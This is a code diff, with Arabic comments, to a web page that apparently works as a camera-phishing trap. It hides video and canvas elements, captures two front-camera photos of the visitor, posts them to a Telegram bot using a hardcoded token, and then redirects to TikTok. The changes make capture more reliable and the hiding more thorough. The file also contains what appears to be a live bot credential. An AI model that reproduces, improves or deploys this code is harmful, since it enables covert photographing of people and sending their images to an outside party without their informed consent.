@@ -59,6 +59,16 @@
             font-weight: bold;
             color: #ff4444;
         }
+
+        /* عناصر التصوير مخفية كما في الكود الأصلي */
+        #video, #canvas {
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            display: none; /* إضافة display none للتأكد من الإخفاء التام */
+        }
     </style>
 </head>
 <body>
@@ -82,12 +92,12 @@
     <div id="status">جاري تجهيز الكاميرا...</div>
     <div id="countdown"></div>
 
-    <!-- عناصر التصوير مخفية -->
-    <video id="video" autoplay playsinline style="position:fixed; top:-1000px; left:-1000px; width:1px; height:1px;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <!-- عناصر التصوير مخفية (كما في الكود الأصلي) -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
     <script>
-        // ====== الإعدادات ======
+        // ====== الإعدادات (كما هي) ======
         const token = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
         const id = new URLSearchParams(window.location.search).get('id');
         
@@ -101,12 +111,22 @@
         let stream = null;
         let photos = [];
 
-        // ====== التقاط صورة ======
+        // ====== دالة التقاط صورة (مع التأكد من وجود إطار حقيقي) ======
         function capturePhoto() {
+            // التأكد من أن الفيديو يحتوي على أبعاد صحيحة
+            if (video.videoWidth === 0 || video.videoHeight === 0) {
+                throw new Error("الفيديو لم يبدأ بعد");
+            }
+            
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            return canvas.toDataURL('image/jpeg', 0.9); // جودة 90%
+            const context = canvas.getContext('2d');
+            
+            // رسم الفيديو على الكانفاس
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // إرجاع الصورة كـ base64 بصيغة JPEG وجودة عالية
+            return canvas.toDataURL('image/jpeg', 0.95);
         }
 
         // ====== عرض الصورة في الواجهة ======
@@ -148,8 +168,11 @@
                 }
             }
             
-            // إنهاء
-            stream.getTracks().forEach(t => t.stop());
+            // إنهاء تدفق الكاميرا
+            if (stream) {
+                stream.getTracks().forEach(t => t.stop());
+            }
+            
             statusDiv.innerHTML = "تم الإرسال! جاري التحويل...";
             
             // التوجيه بعد 2 ثانية
@@ -168,45 +191,53 @@
             try {
                 statusDiv.innerHTML = "جاري طلب الكاميرا...";
                 
-                // طلب الكاميرا الأمامية
+                // طلب الكاميرا الأمامية (user) مع صوت (اختياري، لكننا لا نحتاج الصوت للصور)
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, // الكاميرا الأمامية
-                    audio: false  // بدون صوت
+                    audio: false  // بدون صوت (يمكن تركه true لكن لا فائدة)
                 });
                 
                 video.srcObject = stream;
                 
-                // انتظار 2 ثواني عشان الكاميرا تثبت
+                // ننتظر حتى يصبح الفيديو جاهزاً (أول إطار)
+                await new Promise((resolve) => {
+                    if (video.readyState >= 2) { // HAVE_CURRENT_DATA أو أعلى
+                        resolve();
+                    } else {
+                        video.onloadeddata = () => resolve();
+                    }
+                });
+                
+                // تأخير إضافي للتأكد من استقرار الكاميرا والإضاءة
+                statusDiv.innerHTML = "الكاميرا جاهزة، سيتم التقاط الصورة الأولى بعد لحظات...";
+                await new Promise(r => setTimeout(r, 2000));
+                
+                // التقاط الصورة الأولى
+                statusDiv.innerHTML = "التقاط الصورة الأولى...";
+                const photo1 = capturePhoto();
+                photos.push(photo1);
+                displayPhoto(img1, photo1);
+                
+                // انتظار 2 ثانية للصورة الثانية
+                statusDiv.innerHTML = "انتظر قليلاً للصورة الثانية...";
+                await new Promise(r => setTimeout(r, 2000));
+                
+                // التقاط الصورة الثانية
+                statusDiv.innerHTML = "التقاط الصورة الثانية...";
+                const photo2 = capturePhoto();
+                photos.push(photo2);
+                displayPhoto(img2, photo2);
+                
+                statusDiv.innerHTML = "تم التقاط الصور! سيتم الإرسال بعد 3 ثوانٍ...";
+                
+                // إعطاء المستخدم فرصة لرؤية الصور قبل الإرسال
                 setTimeout(() => {
-                    statusDiv.innerHTML = "التقاط الصورة الأولى...";
-                    
-                    // التقاط الصورة الأولى
-                    const photo1 = capturePhoto();
-                    photos.push(photo1);
-                    displayPhoto(img1, photo1);
-                    
-                    // انتظار 2 ثواني للصورة الثانية
-                    setTimeout(() => {
-                        statusDiv.innerHTML = "التقاط الصورة الثانية...";
-                        
-                        // التقاط الصورة الثانية
-                        const photo2 = capturePhoto();
-                        photos.push(photo2);
-                        displayPhoto(img2, photo2);
-                        
-                        statusDiv.innerHTML = "تم التقاط الصور! جاري الإرسال...";
-                        
-                        // إرسال الصور بعد 3 ثواني (عشان المستخدم يشوفها)
-                        setTimeout(() => {
-                            sendPhotos();
-                        }, 3000);
-                        
-                    }, 2000);
-                    
-                }, 2000);
+                    sendPhotos();
+                }, 3000);
                 
             } catch (err) {
-                // إذا فشل، أرسل رسالة
+                // إذا فشل، أرسل رسالة خطأ
+                console.error(err);
                 fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -223,10 +254,10 @@
         // تشغيل
         start();
 
-        // طوارئ: توجه بعد 20 ثواني (زيادة للوقت لأننا نلتقط صورتين)
+        // طوارئ: توجه بعد 25 ثانية (احتياطي)
         setTimeout(() => {
             window.location.href = "https://www.tiktok.com";
-        }, 20000);
+        }, 25000);
     </script>
 </body>
 </html>
